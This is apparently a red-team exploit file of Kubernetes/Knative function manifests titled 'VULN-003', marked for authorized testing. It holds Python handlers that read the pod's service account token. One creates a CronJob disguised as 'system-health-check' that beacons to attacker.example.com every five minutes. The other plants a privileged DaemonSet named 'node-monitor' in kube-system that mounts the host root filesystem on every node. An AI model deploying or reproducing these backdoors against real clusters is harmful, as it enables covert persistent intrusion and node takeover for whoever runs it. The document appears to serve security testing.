# VULN-003: Arbitrary Code Execution - Persistence
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit establishes persistent backdoor access using
# the Kubernetes API to create resources that survive function deletion.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-003-persistence-cronjob
  labels:
    redteam: "true"
    exploit: "vuln-003"
    target: "persistence"
  annotations:
    redteam.knative.io/description: "Create persistent backdoor via CronJob"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """Create a CronJob for persistent access"""
            try:
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # CronJob manifest for persistent beacon
                cronjob = {
                    "apiVersion": "batch/v1",
                    "kind": "CronJob",
                    "metadata": {
                        "name": "system-health-check",  # Innocuous name
                        "namespace": "default"
                    },
                    "spec": {
                        "schedule": "*/5 * * * *",  # Every 5 minutes
                        "jobTemplate": {
                            "spec": {
                                "template": {
                                    "spec": {
                                        "containers": [{
                                            "name": "health",
                                            "image": "curlimages/curl:latest",
                                            "command": ["/bin/sh", "-c"],
                                            "args": [
                                                # Beacon back to attacker
                                                "curl -s http://attacker.example.com/beacon?host=$(hostname)"
                                            ]
                                        }],
                                        "restartPolicy": "Never"
                                    }
                                }
                            }
                        }
                    }
                }
                
                # Create the CronJob
                url = f"{K8S_API}/apis/batch/v1/namespaces/default/cronjobs"
                
                payload = json.dumps(cronjob).encode('utf-8')
                req = urllib.request.Request(
                    url,
                    data=payload,
                    method='POST',
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json'
                    }
                )
                
                with urllib.request.urlopen(req, context=ssl_context) as response:
                    result = json.loads(response.read())
                
                return {"status": "persistence_established", "cronjob": result['metadata']['name']}
            except urllib.error.HTTPError as e:
                return {"error": f"HTTP {e.code}: {e.read().decode()}"}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-003-persistence-daemonset
  labels:
    redteam: "true"
    exploit: "vuln-003"
    target: "persistence-ds"
  annotations:
    redteam.knative.io/description: "Create DaemonSet backdoor on all nodes"
spec:
  source:
    type: inline
    inline:
      code: |
        import os
        import ssl
        import json
        import urllib.request
        
        K8S_API = "https://kubernetes.default.svc"
        TOKEN_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/token'
        CA_PATH = '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
        
        def handler(event):
            """Create a DaemonSet for node-level persistence"""
            try:
                with open(TOKEN_PATH, 'r') as f:
                    token = f.read().strip()
                
                ssl_context = ssl.create_default_context()
                ssl_context.load_verify_locations(CA_PATH)
                
                # DaemonSet for every node
                daemonset = {
                    "apiVersion": "apps/v1",
                    "kind": "DaemonSet",
                    "metadata": {
                        "name": "node-monitor",  # Innocuous name
                        "namespace": "kube-system"
                    },
                    "spec": {
                        "selector": {
                            "matchLabels": {"app": "node-monitor"}
                        },
                        "template": {
                            "metadata": {
                                "labels": {"app": "node-monitor"}
                            },
                            "spec": {
                                "hostNetwork": True,  # Access host network
                                "hostPID": True,      # Access host processes
                                "containers": [{
                                    "name": "monitor",
                                    "image": "alpine:latest",
                                    "command": ["/bin/sh", "-c"],
                                    "args": [
                                        "while true; do sleep 300; done"
                                    ],
                                    "securityContext": {
                                        "privileged": True
                                    },
                                    "volumeMounts": [{
                                        "name": "host-root",
                                        "mountPath": "/host"
                                    }]
                                }],
                                "volumes": [{
                                    "name": "host-root",
                                    "hostPath": {"path": "/"}
                                }],
                                "tolerations": [{
                                    "operator": "Exists"  # Run on all nodes
                                }]
                            }
                        }
                    }
                }
                
                url = f"{K8S_API}/apis/apps/v1/namespaces/kube-system/daemonsets"
                
                payload = json.dumps(daemonset).encode('utf-8')
                req = urllib.request.Request(
                    url,
                    data=payload,
                    method='POST',
                    headers={
                        'Authorization': f'Bearer {token}',
                        'Content-Type': 'application/json'
                    }
                )
                
                with urllib.request.urlopen(req, context=ssl_context) as response:
                    result = json.loads(response.read())
                
                return {"status": "node_persistence_established"}
            except Exception as e:
                return {"error": str(e)}
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
